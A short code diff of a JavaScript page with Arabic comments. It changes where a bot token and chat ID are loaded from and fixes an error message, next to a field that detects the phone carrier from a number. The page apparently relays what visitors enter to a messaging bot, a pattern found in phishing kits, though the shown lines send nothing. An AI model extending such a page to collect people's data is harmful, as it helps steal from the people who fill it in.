@@ -60,16 +60,16 @@
     let chatId = '';
 
     // تحميل إعدادات البوت
-    fetch('/config')
-      .then(res => res.json())
-      .then(data => {
-        botToken = data.botToken;
-        chatId = data.chatId;
-      })
-      .catch(err => {
-        console.error('فشل تحميل انتظر:', err);
-        alert('فشل تحميل انتظر.');
-      });
+    fetch('config.json')
+  .then(res => res.json())
+  .then(data => {
+    botToken = data.botToken;
+    chatId = data.chatId;
+  })
+  .catch(err => {
+    console.error('فشل تحميل الإعدادات:', err);
+    alert('فشل تحميل الإعدادات.');
+  });
 
     // كشف مزود الخدمة تلقائياً
     document.getElementById('phoneNumber').addEventListener('input', () => {
